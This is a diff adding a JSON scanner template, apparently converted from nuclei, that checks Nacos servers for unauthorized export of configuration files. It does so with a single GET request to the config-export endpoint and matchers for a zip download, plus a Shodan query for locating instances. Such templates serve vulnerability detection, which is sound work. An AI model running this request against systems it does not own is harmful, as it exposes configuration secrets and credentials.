@@ -1,0 +1,123 @@
+{
+  "id": "nacos-info-leak",
+  "name": "Nacos - Information Disclosure",
+  "author": "s4e-io",
+  "severity": "HIGH",
+  "description": "Nacos unauthorized download of configuration information.\n",
+  "references": [
+    "https://github.com/wy876/POC/blob/main/Nacos/Nacos%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8B%E8%BD%BD%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF.md"
+  ],
+  "tags": [
+    "nacos",
+    "tech",
+    "config",
+    "exposure"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "shodan": "title:\"Nacos\""
+  },
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}/v1/cs/configs?export\u003dtrue\u0026group\u003d\u0026tenant\u003d\u0026appName\u003d\u0026ids\u003d\u0026dataId\u003d",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "contains(body, \"PK\")",
+            "contains(content_type, \"application/octet-stream\")",
+            "regex(\"attachment;filename\u003d(.*).zip\", content_disposition)",
+            "status_code \u003d\u003d 200"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "nacos-info-leak",
+    "info": {
+      "name": "Nacos - Information Disclosure",
+      "author": "s4e-io",
+      "severity": "high",
+      "description": "Nacos unauthorized download of configuration information.\n",
+      "reference": [
+        "https://github.com/wy876/POC/blob/main/Nacos/Nacos%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8B%E8%BD%BD%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF.md"
+      ],
+      "metadata": {
+        "max_request": 1,
+        "shodan_query": "title:\"Nacos\""
+      },
+      "tags": "nacos,tech,config,exposure"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/v1/cs/configs?export\u003dtrue\u0026group\u003d\u0026tenant\u003d\u0026appName\u003d\u0026ids\u003d\u0026dataId\u003d"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "contains(body, \"PK\")",
+              "contains(content_type, \"application/octet-stream\")",
+              "regex(\"attachment;filename\u003d(.*).zip\", content_disposition)",
+              "status_code \u003d\u003d 200"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
